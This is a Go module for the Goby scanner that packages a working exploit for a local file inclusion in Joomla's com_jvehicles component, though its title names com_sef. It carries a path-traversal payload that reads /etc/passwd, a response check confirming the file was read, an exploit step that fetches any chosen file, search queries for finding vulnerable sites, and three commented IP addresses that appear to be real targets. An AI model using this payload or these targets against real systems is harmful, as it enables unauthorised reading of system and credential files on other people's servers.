package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "Joomla Component com_sef Local File Inclusion",
    "Description": "<p>Jvehicles is a background management plugin for Joomla!.</p><p>A local file inclusion vulnerability exists in Joomla!'s Jvehicles (com_jvehicles) component! Allows remote attackers to load arbitrary files via controller parameters in index.php.</p>",
    "Product": "Joomla",
    "Homepage": "http://www.jvehicles.com/",
    "DisclosureDate": "2022-07-15",
    "Author": "abszse",
    "FofaQuery": "body=\"Joomla!\" && body=\"/invisible.gif\"",
    "GobyQuery": "body=\"Joomla!\" && body=\"/invisible.gif\"",
    "Level": "2",
    "Impact": "<p>A local file inclusion vulnerability exists in Joomla!'s Jvehicles (com_jvehicles) component! Allows remote attackers to load arbitrary files via controller parameters in index.php.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released an upgrade patch to fix the vulnerability, please pay attention to the official website update in time: <a href=\"http://www.jvehicles.com/\">http://www.jvehicles.com/</a></p>",
    "References": [
        "https://www.exploit-db.com/exploits/11997"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?option=com_jvehicles&controller={{{cmd}}}%00",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Inclusion"
    ],
    "VulType": [
        "File Inclusion"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Joomla Component com_sef 本地文件包含漏洞",
            "Product": "Joomla",
            "Description": "<p>Jvehicles 是Joomla! 的一款后台管理插件。<br></p><p>Joomla! 的 Jvehicles (com_jvehicles) 组件存在本地文件包含漏洞，允许远程攻击者通过 index.php 中的控制器参数加载任意文件。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布升级补丁以修复漏洞，请及时关注官网更新：<a href=\"http://www.jvehicles.com/\">http://www.jvehicles.com/</a><br></p>",
            "Impact": "<p>Joomla! 的 Jvehicles (com_jvehicles) 组件存在本地文件包含漏洞，允许远程攻击者通过 index.php 中的控制器参数加载任意文件。<br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Joomla Component com_sef Local File Inclusion",
            "Product": "Joomla",
            "Description": "<p>Jvehicles is a background management plugin for Joomla!.<br></p><p>A local file inclusion vulnerability exists in Joomla!'s Jvehicles (com_jvehicles) component! Allows remote attackers to load arbitrary files via controller parameters in index.php.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released an upgrade patch to fix the vulnerability, please pay attention to the official website update in time: <a href=\"http://www.jvehicles.com/\">http://www.jvehicles.com/</a><br></p>",
            "Impact": "<p>A local file inclusion vulnerability exists in Joomla!'s Jvehicles (com_jvehicles) component! Allows remote attackers to load arbitrary files via controller parameters in index.php.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}

//http://193.49.55.71:10000
//http://193.49.55.29:10000
//http://193.49.55.118:10000
